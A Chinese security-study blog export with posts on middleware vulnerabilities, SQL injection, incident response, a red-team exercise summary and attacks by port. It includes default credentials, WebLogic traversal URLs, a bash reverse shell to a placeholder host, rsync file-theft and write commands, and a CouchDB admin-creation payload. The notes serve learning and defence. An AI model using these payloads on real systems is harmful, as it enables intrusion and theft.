title="有哪些常见的框架/中间件漏洞"></a>有哪些常见的框架/中间件漏洞</h5><p><strong>Python_Django</strong><br>目录遍历漏洞、重置密码漏洞、SQL注入漏洞、任意代码执行</p><p><strong>Python_Flask</strong><br>SSTI模板注入漏洞（后面再学习）</p><p><strong>Python_Web2py</strong><br>本地文件包含漏洞、输入验证漏洞</p><p><strong>Python_Tornado</strong><br>Tornado是非阻塞式服务器，而且速度相当快<br>文件读取漏洞：os.path.abspath函数获得的路径，是没有结尾处的”/“的，因此可以自己构造路径<br>模板注入漏洞：同样后面再学习</p><p><strong>Python_Scrapy</strong><br>scrapyd未授权访问漏洞:6800端口可以部署恶意的scrapy包到云服务，进而获取服务器权限<br>Scrapy反序例化漏洞</p><p><strong>struts2</strong><br>struts是java的web框架<br>在注册或登录页面，提交失败后一般会默认返回之前提交的数据<br>由于后端使用<code>%&#123;value&#125;</code>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。<br>……</p><p><strong>weblogic</strong><br>weblogic是java的web框架<br>弱口令漏洞：</p><pre><code>用户名：weblogic、system、admin、WebLogic密码：weblogic、weblogic123、password、security、system、admin、WebLogic然后在上传处上传一个jsp类型的小马的war包来拿到shell</code></pre><p>任意文件读取漏洞：</p><pre><code>http://ip:7001/hello/file.jsp?path=  #接文件路径Weblogic 后台的密文与密钥这两个文件分别为 config.xml 和 SerializedSystemIni.dat</code></pre><p>未授权远程命令执行漏洞：</p><pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal或http://ip:7001/console/images/%252e%252e%252fconsole.portal或者构造一个反弹shell XML 文件，通过访问这个文件来执行命令</code></pre><h5 id="远程代码执行漏洞分类"><a href="#远程代码执行漏洞分类" class="headerlink" title="远程代码执行漏洞分类"></a>远程代码执行漏洞分类</h5><ol><li>直接调用系统函数例如exec</li><li>把序列化的包反序列化的时候调用不当出现了rce</li></ol><h5 id="常见反序列化的流量特征"><a href="#常见反序列化的流量特征" class="headerlink" title="常见反序列化的流量特征"></a>常见反序列化的流量特征</h5><p>shiro就看cookie中rememberMe字段，什么都要从这里传<br>fastjson：可以在提交的包中找找json格式的数据，重点看一下有无rmi或者出网的一些行为，（在十六进制中会呈现ACED开头，这段不确定）<br>st2-045：请求头中的Content-Type字段</p><h5 id="问漏洞题不会回答怎么办"><a href="#问漏洞题不会回答怎么办" class="headerlink" title="问漏洞题不会回答怎么办"></a>问漏洞题不会回答怎么办</h5><ol><li>先讲漏洞原理</li><li>漏洞特征，流量，返回码</li><li>结合设备特性讲</li></ol><h5 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h5><p><strong>报错注入</strong></p><pre><code>updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数extractvalue()      是mysql对xml文档数据进行查询的xpath函数floor()             mysql中用来取整的函数exp()               此函数返回e(自然对数的底)指数X的幂值</code></pre><p><strong>时间盲注</strong></p><pre><code>sleep()             直接延迟时间benchmark()         通过计算md5消耗时间</code></pre><p><strong>堆叠植入</strong></p><pre><code>mysqli_multi_query()    可以使用;堆叠多条语句</code></pre><p><strong>宽字节注入</strong></p><pre><code>使用PHP连接Mysql的时候，当设置&quot;character_set_client=gbk&quot;时会导致一个编码转换的问题mysql在使用GBK编码的时候，会认为两个字符是一个汉字GBK就是常说的宽字节之一，实际上只有两个字节前一个ASCII码要大于128,才到汉字的范围</code></pre><p><strong>防护方案</strong></p><ol><li>预编译</li><li>限制长度</li><li>加WAF</li><li>通信加密<br>其中预编译：<br>因为sql注入是因为动态字符串的拼接导致sql命令发生改变，然后编译并且执行错误的结果。<br>而sql预处理则是提前“告诉”sql语法处理器，提前声明并且编译特定格式的sql语句，然后将所有用户的输入视为纯字符串参数，最后组成查询语句。</li></ol><p><strong>sql注入的进一步利用</strong></p><ol><li>拖库</li><li>在有绝对路径和into outfile函数时写shell到web目录下</li><li>服务器超管，获取服务器管理员权限</li><li>mssql2005之前在SQLsever利用xp_cmdshell提权</li><li>UDF提权是用户自定义函数，写一个恶意的dll到系统system32目录下（定义一个可以执行系统命令的函数）</li></ol><h5 id="常见的解析漏洞有哪些"><a href="#常见的解析漏洞有哪些" class="headerlink" title="常见的解析漏洞有哪些"></a>常见的解析漏洞有哪些</h5><ul><li>IIS 6.0   /xx.asp/xx.jpg “xx.asp”是文件夹名</li><li>IIS 7.0   /7.5默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</li><li>Nginx 版本小于等于 0.8.37，利用方法和IIS7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg.php</li><li>Apache上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</li><li>lighttpd xx.jpg/xx.php，</li></ul><h5 id="ISS服务器要做哪些方面保护措施"><a href="#ISS服务器要做哪些方面保护措施" class="headerlink" title="ISS服务器要做哪些方面保护措施"></a>ISS服务器要做哪些方面保护措施</h5><ol><li>保持 Windows 升级:</li><li>使用 IIS 防范工具</li><li>移除缺省的 Web 站点</li><li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li><li>有规则地检查你的管理员组和服务:</li><li>严格控制服务器的写访问权限</li><li>设置复杂的密码</li><li>减少/排除 Web 服务器上的共享</li><li>禁用 TCP/IP 协议中的 NetBIOS:</li><li>使用 TCP 端口阻塞</li><li>仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat</li><li>管理 IIS 目录安全:</li><li>使用 NTFS 安全:</li><li>管理用户账户</li><li>审计你的 Web 服务器</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应概述</title>
      <link href="/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="应急响应概述"><a href="#应急响应概述" class="headerlink" title="应急响应概述"></a>应急响应概述</h3><h4 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h4><p>事件判断:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。<br>临时处置:给出客户临时处置建议，断网隔离，保护现场环境。<br>信息收集分析:收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析、样本分析。<br>清理处置:直接杀掉进程，删除文件，打补丁，抑或是修复文件。<br>产出报告:整理并输出完整的安全事件报告。</p><h4 id="常受攻击Web漏洞"><a href="#常受攻击Web漏洞" class="headerlink" title="常受攻击Web漏洞"></a>常受攻击Web漏洞</h4><table><thead><tr><th>攻击平台</th><th>漏洞编号</th></tr></thead><tbody><tr><td>Weblogic</td><td>CVE-2017-3248/CVE-2017-10271/CVE-2018-2628/CVE-2018-2894</td></tr><tr><td>Drupal</td><td>CVE-2018-7600/CVE-2018-7602</td></tr><tr><td>Struts2</td><td>CVE-2017-5638/CVE-2017-9805/CVE-2018-11776</td></tr><tr><td>ThinkPHP</td><td>ThinkPHPv5 GetShell</td></tr><tr><td>Windows Server</td><td>弱口令爆破/CVE-2017-0143</td></tr><tr><td>PHPStudy</td><td>弱口令爆破</td></tr><tr><td>PHPMyAdmin</td><td>弱口令爆破</td></tr><tr><td>MySQL</td><td>弱口令爆破</td></tr><tr><td>Tomcat</td><td>弱口令爆破/CVE-2017-12615</td></tr><tr><td>Spring Data Commons</td><td>CVE-2018-1273</td></tr><tr><td>Jekins</td><td>CVE-2019-1003000</td></tr><tr><td>JBoss</td><td>CVE-2010-0738/CVE-2017-12149</td></tr></tbody></table><h4 id="常受攻击组件漏洞"><a href="#常受攻击组件漏洞" class="headerlink" title="常受攻击组件漏洞"></a>常受攻击组件漏洞</h4><table><thead><tr><th>应用</th><th>漏洞名</th></tr></thead><tbody><tr><td>Docker</td><td>Docker未授权漏洞</td></tr><tr><td>Nexus Repository</td><td>Nexus Repository Manager 3远程代码执行漏洞</td></tr><tr><td>ElasticSearch</td><td>ElasticSearch未授权漏洞</td></tr><tr><td>Hadoop Yarn</td><td>Hadoop Yarn REST API未授权漏洞</td></tr><tr><td>Kubernetes</td><td>Kubernetes Api Server 未授权漏洞</td></tr><tr><td>Jenkins</td><td>Jenkins RCE(CVE-2019-1003000)</td></tr><tr><td>Spark</td><td>Spark REST API未授权漏洞</td></tr></tbody></table><h4 id="处置思路"><a href="#处置思路" class="headerlink" title="处置思路"></a>处置思路</h4><ol><li>找到webshell</li><li>确定攻击者IP（合理猜测）</li><li>回溯攻击者操作</li><li>梳理整个攻击过程（据实分析，积极沟通）</li></ol><h4 id="应急前沟通"><a href="#应急前沟通" class="headerlink" title="应急前沟通"></a>应急前沟通</h4><ul><li>现场现象是什么?如何发现的?(依据是什么) ?</li><li>什么时候发现的?</li><li>目前是否有做物理隔离(断网) ?</li><li>受害机器是哪个?</li><li>受害服务有几台?(1台/N台)</li><li>最先发现是哪台 ?</li><li>这台服务器对外有哪些服务?</li><li>这台服务器于其他机器是否处于同一个内网?</li><li>操作系统类型? </li><li>是否有公网映射业务? </li><li>远程管理方式? </li><li>网络边界有没有流量监控设备? </li><li>主机侧是否有EDR等安全设备</li></ul><h4 id="响应事件——Web攻击"><a href="#响应事件——Web攻击" class="headerlink" title="响应事件——Web攻击"></a>响应事件——Web攻击</h4><p><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容、拖库、内网沦陷等排查<br><strong>要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 备份文件;webshell后门查杀;web日志分析;web中间件缓存处理;web中间件配置检查;重启web中间件;服务器后门检查;<br><strong>防护措施:</strong> 加固相关web应用，修改相关系统的所有用户密码</p><h4 id="响应事件——链路劫持"><a href="#响应事件——链路劫持" class="headerlink" title="响应事件——链路劫持"></a>响应事件——链路劫持</h4><p><strong>相关表现:</strong> 区域性服务不可用或返回异常内容<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容等<br><strong>排查要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围:在能复现的环境中判断是DNS劫持还是HTTP劫持<br><strong>防护措施:</strong> 重要业务部署https</p><h4 id="响应事件——代理隧道"><a href="#响应事件——代理隧道" class="headerlink" title="响应事件——代理隧道"></a>响应事件——代理隧道</h4><p><strong>相关表现:</strong> 持续性或间断性外连行为，通常为tcp协议，对内网多个主机有访问行为<br><strong>相关危害:</strong> 作为跳板机攻击其他内网资产<br><strong>排查要点:</strong> 确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型<br><strong>防护措施:</strong> 完善内网acl，服务器按业务需要通过白名单策略访问外网</p><h4 id="响应事件——替换系统命令"><a href="#响应事件——替换系统命令" class="headerlink" title="响应事件——替换系统命令"></a>响应事件——替换系统命令</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面<br><strong>操作要点:</strong> 使用静态链接的busybox;重新安装被替换的包<br><strong>命令:</strong> </p><pre><code>rpm -Vadpkg --verify</code></pre><h4 id="响应事件——ld-so-preload动态链接库劫持"><a href="#响应事件——ld-so-preload动态链接库劫持" class="headerlink" title="响应事件——ld.so.preload动态链接库劫持"></a>响应事件——ld.so.preload动态链接库劫持</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 检查/etc/ld.so.preload，ld.so(如/lib/x86_64-linux-gnu/ld-2.27.so)<br><strong>操作要点:</strong> 使用静态链接的busybox; 重启被注入恶意模块的进程，必要时直接重启系统</p><h4 id="响应事件——内核态rootkit"><a href="#响应事件——内核态rootkit" class="headerlink" title="响应事件——内核态rootkit"></a>响应事件——内核态rootkit</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:隐藏文件、进程等信息<br><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程;<br><strong>操作要点:</strong> 使用tyton内核态rootkit检测工具检测:检查/etc/modules是否有未知的内核模块</p><h4 id="响应事件——计划任务"><a href="#响应事件——计划任务" class="headerlink" title="响应事件——计划任务"></a>响应事件——计划任务</h4><p><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS请求、篡改页面等行为<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:周期性篡改页面、拉取数据等<br><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查/var/spool/cron/crontabs/，/etc/cron.*等常用计划任务配置文件<br><strong>操作要点:</strong> 停止计划任务服务后再操作;注意辨别利用\r回车符的障眼法小技巧</p><h4 id="响应事件——远控木马"><a href="#响应事件——远控木马" class="headerlink" title="响应事件——远控木马"></a>响应事件——远控木马</h4><p><strong>相关表现:</strong> 有持续或间断性的对外网络链接或DNS请求等通信行为<br><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器<br><strong>排查要点:</strong> 关注tcp、udp、icmp等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点<br><strong>操作要点:</strong> 检查网络连接，以及IDS设备上的异常远控告警</p><h3 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><table><thead><tr><th>常用命令</th><th>说明</th></tr></thead><tbody><tr><td>regedit</td><td>注册表</td></tr><tr><td>Taskmgr</td><td>注册表</td></tr><tr><td>Msconfig</td><td>系统配置(包含启动项)</td></tr><tr><td>eventvwr.msc</td><td>事件查看器</td></tr><tr><td>compmgmt.msc</td><td>计算机管理(本地用户和组)</td></tr><tr><td>gpedit.msc</td><td>本地组策略</td></tr><tr><td>taskschd.msc</td><td>计划任务</td></tr><tr><td>lusrmgr.msc</td><td>本地用户和组</td></tr></tbody></table><pre><code>获取本机用户列表: net user本机管理员: net localgroup administrators查看当前会话: net session查看当前运行的服务: net start远程连接: net use查看当前用户下的共享目录: net share最近打开的文件:%UserProfile%\Recent          %APPDATA%\Microsoft\Windows\Recent          查找文件中的字符串: findstr /m /i /s &quot;hello&quot; *.txt查看网络连接: netstat - ano操作系统的详细配置信息: systeminfo获取系统进程信息: Wmic process根据应用程序查找PID: wmic process where name=&quot;cmd.exe”get processid,executablepath,name根据PID查找应用程序: wmic process where processid=&quot;4296”get executablepath,name获取系统进程信息:tasklist对于要查询特定dll的调用情况，可以使用命令tasklist /m dll名称计算样本MD5: certutil -hashfile %样本文件名% MD5</code></pre><h4 id="应急管理工具"><a href="#应急管理工具" class="headerlink" title="应急管理工具"></a>应急管理工具</h4><p><strong>PChunter</strong><br>系统信息监控工具，主要拿来看数字签名<br>黑色是微软认证的<br>粉红色是未认证的<br>红色是可疑进程</p><p><strong>Autoruns</strong><br>启动项、计划任务等动态监测工具</p><p><strong>Process Explorer</strong><br>应用程序监测工具<br>数据量很大，需要过滤</p><p><strong>TCPView</strong><br>其实就是<code>netstat -ano</code>的输出，但是可视化方便处理</p><p><strong>Microsoft Network Monitor</strong><br>很小的一个流量监控软件<br>安装完需要重启，可以监测单个程序进程</p><p><strong>D盾</strong><br>查杀webshell</p><p><strong>Everything</strong><br>快速查找文件和目录</p><p><strong>sysmon</strong><br>微软开发的系统监控工具，常用来判断挖矿后门等等</p><table><thead><tr><th>ID</th><th>说明</th></tr></thead><tbody><tr><td>Event ID 1</td><td>进程创建事件，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等</td></tr><tr><td>Event ID 3</td><td>网络连接事件，当恶意程序外连 CC 服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</td></tr><tr><td>Event ID 11</td><td>文件创建事件，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用.，而这些目录正是初始感染阶段恶意运行要用到的目录</td></tr><tr><td>Event ID 22</td><td>记录 DNS 查询，容易受该功能影响的一种场景就是基于 DNS 的 C2 通信，其中大量请求会被记录下来</td></tr></tbody></table><p><strong>威胁分析平台</strong></p><p><strong>BeaconEye</strong><br>监测CS木马后门特征</p><p><strong>DumpIt</strong><br>内存取证工具，需要dump整个系统，取证空间占用太大，不建议使用<br>替代工具:<code>FTK Imager</code>和<code>WinPMem</code></p><p><strong>Volatility</strong><br>内存取证工具</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>windows主要有以下三类日志记录系统事件: 系统日志、安全日志、应用程序日志</p><pre><code>打开方式:1、开始 -&gt; 运行 -&gt; eventvwr2、开始-&gt; 管理工具 -&gt; 事件查看 -&gt; 安全</code></pre><p><strong>系统日志</strong><br>默认位置:%SystemRoot%System32WinevtLogsSystem.evtx</p><table><thead><tr><th>事件</th><th>ID</th></tr></thead><tbody><tr><td>系统启动</td><td>6005</td></tr><tr><td>事件日志服务已启动</td><td>6006</td></tr><tr><td>事件日志服务已停止</td><td>12</td></tr><tr><td>系统关闭</td><td>13</td></tr></tbody></table><p><strong>安全日志</strong><br>%SystemRoot%System32WinevtLogsSecurity.evtx<br>注意：不同版本的系统日志ID可能不同，建议自行查找<br><a href="https://smms.app/image/ZjJkrGV3hI9zd5i" target="_blank"><img src="https://s2.loli.net/2023/07/28/ZjJkrGV3hI9zd5i.png" width="400"></a></p><p><strong>应用程序日志</strong><br>%SystemRoot%System32WinevtLogsApplication.evtx</p><h3 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h3><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><p><strong><code>top</code>和<code>ps -aux</code></strong><br>查看系统资源占用</p><p><strong><code>netstat -antpl</code></strong><br>查看网络连接以及其对应可执行程序</p><p><strong>lsof</strong><br>查看开放端口的进程</p><p><strong>登录信息查看</strong><br>显示错误的尝试登录信息: lastb<br>显示系统用户最近的登录信息: last<br>现实所有的用户最近的登录信息: lastlog</p><p><strong>grep</strong><br>查找符合条件的字符串:netstat -antpl lgrep 22</p><p><strong>crontab</strong><br>查看定时任务: crontab -1 、 cat /etc/crontab</p><p><strong>历史命令</strong><br>查看历史命令: history、cat ~/.bash history</p><p><strong>校验RPM软件包</strong><br>校验RPM软件包: rpm -Va、dpkg -verify<br>S：表示对应文件的大小 (Size) 不一致<br>M: 表示对于文件的mode不一致<br>5:表示对应文件的MD5不一致<br>D:表示文件的major和minor号不一致<br>L:表示文件的符号连接内容不一致<br>U:表示文件的owner不一致<br>G: 表示文件的group不一致<br>T:表示文件的修改时间不一致</p><p><strong>其它</strong><br>登录成功的IP<br>grep “Accepted” /var/log/secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>定位有爆破行为的IP<br>grep “Failed password” /var/log/secure awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>查看隐藏进程<br>ps -ef  awk ‘{print $11}’ | sort -n | uniq &gt;1<br>ls /proc | sort -n | uniq &gt;2<br>diff 1 2</p><h4 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h4><p><strong>BusyBox</strong><br>静态链接库的BusyBox<br>当命令被替换时使用<br>赋予可执行权限后.\即可</p><p><strong>chkrootkit</strong><br>监测RootKit的脚本</p><p><strong>Rkhunter</strong><br>同上</p><p><strong>unhide</strong><br>查找隐藏的UDP/TCP进程</p><p><strong>ClamAV</strong><br>检测各种恶意木马，病毒，进程<br>注意是否存在so文件的注入</p><p><strong>河马Webshell</strong></p><h4 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h4><p><a href="https://smms.app/image/PT3z2eDRXrnEfFA" target="_blank"><img src="https://s2.loli.net/2023/07/28/PT3z2eDRXrnEfFA.png" width="400"></a></p><p><a href="https://smms.app/image/QRHjtKZ7Ulh25iW" target="_blank"><img src="https://s2.loli.net/2023/07/28/QRHjtKZ7Ulh25iW.png" width="400"></a></p><p><a href="https://smms.app/image/uS1eGAtZMsj3p2n" target="_blank"><img src="https://s2.loli.net/2023/07/28/uS1eGAtZMsj3p2n.png" width="400"></a></p><p><a href="https://smms.app/image/j3QUfAiM6x1aJOR" target="_blank"><img src="https://s2.loli.net/2023/07/28/j3QUfAiM6x1aJOR.png" width="400"></a></p><p><strong>查找文件中的恶意/危险函数</strong></p><pre><code>PHP: eval(、system(、assert (JSP: getRunTime(、FileOutputStream(ASP: eval(、execute(、ExecuteGlobal (</code></pre><p><strong>从日志记录中查找</strong><br>查看每个 IP 地址访问次数:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c<br>访问URL排序:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c |sort -rn|head<br>访问指定资源日志:<br>cat access.log |awk ‘{print $7}’ |grep /%25Domain |sort|uniq - c |sort -rn|more</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队总结</title>
      <link href="/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。<br>虽然结果排名不高，但是队员们很努力。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>准备</strong><br>首先的话会有提供靶标和虚拟机给你使用，这些机子在上交报告和复现都要用到，其他时候也要挂着VPN。</p><p><strong>信息收集</strong></p><ul><li>先用enscan收集一下企业资产</li><li>使用搜索引擎搜索官网</li><li>在官网上看看各个功能</li><li>使用Wappalyzer查看网站的框架</li><li>用findsomething插件、Find-SomeThing脚本、jjjjjjjjjjjjjs脚本看网页JS信息泄露</li><li>识别git/svn泄露（实在太少而且难以利用）</li><li>使用EHole指纹识别</li><li>dirsearch或者御剑扫描目录，线程不要太高，时间够的不用急</li><li>nmap或者masscan扫端口</li><li><a href="https://rapiddns.io/subdomain">网站1</a>、<a href="https://www.dnsgrep.cn/subdomain/">网站2</a>收集子域名</li><li><a href="https://ping.chinaz.com/">多地点Ping</a>查看真实ip</li><li>zoomeye和shodan根据ip查找（感觉这样子更加准确）</li><li>肉眼分析框架（网上的工具不太会用，手工分析更加方便）</li></ul><p><strong>利用工具检测漏洞</strong></p><ol><li>apt_tools</li><li>LiqunKit</li><li>nuclei</li><li>shiro_attack</li><li>SpringBoot-Scan</li><li>Wpscan</li><li>ThinkphpGUI</li><li>Xray</li><li>神机综合利用工具</li><li>unauthorizedV2未授权检测</li><li>wafw00f识别</li></ol><p><strong>手动检测漏洞</strong></p><ol><li>弱口令爆破</li><li>网页跳转间隔进行未授权访问</li><li>重新审计JS文件寻找未授权</li><li>注册用户文件上传</li><li>更改密码逻辑漏洞</li><li>路径穿越，任意文件读取</li><li>sql注入（渗透中是中危，但是护网中不拿shell、密码或者重要数据的话分数较少）</li><li>伪造token/cookie</li></ol><p><strong>最后</strong><br>收集数据，填写报告上交审核，不过就扯嘴皮。</p><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>因为我们队实力不算很好，还有我这个摸鱼的，所以也没学到特别多的东西，希望以后能跟着大佬一起学习吧。<br>护网的时候拿分应该是有诀窍的，但是俺不知道。<br>信息泄露那成百上千万条估计是个大头，以后红队多注重这方面。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的端口和对应的服务</title>
      <link href="/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/"/>
      <url>/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h4 id="web类"><a href="#web类" class="headerlink" title="web类"></a>web类</h4><p><strong>struts2：</strong><br>太多，略……</p><p><strong>thinkphp：</strong><br><a href="https://smms.app/image/AtUjGFfCBWR9mxz" target="_blank"><img src="https://s2.loli.net/2023/07/19/AtUjGFfCBWR9mxz.png" ></a></p><p><strong>jboss：</strong><br><a href="https://smms.app/image/1sElFjNxyCQTUdw" target="_blank"><img src="https://s2.loli.net/2023/07/19/1sElFjNxyCQTUdw.png" ></a></p><p><strong>ganglia：</strong><br>CVE-2007-6465: 多个跨站脚本攻击漏洞<br>CVE-2012-3448: 未明PHP代码执行漏洞<br>8649端口未授权访问: 通过http协议获取相关监控的xml信息<br>nmap扫描脚本  <code>nmap --script ganglia-info --script-args ganglia-info.timeout=60,ganglia-info.bytes=100000 -p</code></p><p><strong>zabbix：</strong><br>弱口令/默认账号: </p><pre><code>admin:zabbixAdmin:zabbixguest: 空</code></pre><p>ave-2016-10134: sql注入<br>系统命令执行: 管理员登录后Administrator-script-createscript</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1</code></pre><h4 id="数据库类（扫描弱口令）"><a href="#数据库类（扫描弱口令）" class="headerlink" title="数据库类（扫描弱口令）"></a>数据库类（扫描弱口令）</h4><p><strong>MSSQL</strong></p><pre><code>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）攻击方法：    爆破：弱口令/使用系统用户    注入参考：    https://www.anquanke.com/post/id/86011</code></pre><p><strong>Oracle</strong></p><pre><code>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）攻击方法：    爆破：弱口令    注入攻击；    漏洞攻击；    -参考：    https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</code></pre><p><strong>MySQL</strong></p><pre><code>默认端口：3306攻击方法：    爆破：弱口令    身份认证漏洞：CVE-2012-2122    拒绝服务攻击    Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意    提权参考：    https://www.seebug.org/appdir/MySQL    http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390    https://xz.aliyun.com/t/1491</code></pre><p><strong>PostgreSQL</strong></p><pre><code>默认端口：5432攻击方法：    爆破：弱口令：postgres postgres    缓冲区溢出：CVE-2014-2669参考：    http://drops.xmd5.com/static/drops/tips-6449.html    https://www.secpulse.com/archives/69153.html</code></pre><p><strong>MongoDB</strong></p><pre><code>默认端口：27017攻击方法：    爆破：弱口令    未授权访问；github有攻击代码；请点击参考：    http://www.cnblogs.com/LittleHann/p/6252421.html    http://www.tiejiang.org/19157.html</code></pre><p><strong>Redis</strong></p><pre><code>攻击方法：    爆破：弱口令    未授权访问+配合ssh key提权；参考：    http://www.alloyteam.com/2017/07/12910/</code></pre><p><strong>SysBase</strong></p><pre><code>默认端口：服务端口5000；监听端口4100；备份端口：4200攻击方法：    爆破：弱口令    命令注入：</code></pre><p><strong>DB2</strong></p><pre><code>默认端口：5000攻击方法：    安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）参考：    http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</code></pre><h4 id="特殊服务类（未授权-命令执行-漏洞）"><a href="#特殊服务类（未授权-命令执行-漏洞）" class="headerlink" title="特殊服务类（未授权/命令执行/漏洞）"></a>特殊服务类（未授权/命令执行/漏洞）</h4><p><strong>443 SSL心脏滴血</strong><br>该落地是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。<br>攻击原理是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），导致可以读取的数据比应该允许读取的还多。<br>利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。</p><p><strong>873 Rsync未授权</strong><br>rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录。<br>由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p><pre><code>【列目录】rsync --port=xxx ip::rsync rsync://192.168.241.142:873/【看目录】rsync --port=xxx ip::目录名rsync rsync://192.168.241.142:873/src/【文件下载】rsync --port=xxx ip::目录名 ./rsync -av rsync://192.168.241.142:873/src/etc/passwd ./【文件写入】rsync -av muma.txt rsync://192.168.241.142:873/src/target.txt利用文件上传设置计划任务来反弹shell</code></pre><p><strong>5984 CouchDB未授权</strong></p><p>CVE-2017-12635权限绕过：到/_utils 目录下验证登陆,后续使用反弹shell进行进一步利用</p><pre><code>PUT /_users/org.couchdb.user:vulhub&#123;  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;vulhub&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;vulhub&quot;&#125;</code></pre><p><strong>6379 redis未授权</strong><br><code>./redis-cli -h ip</code>  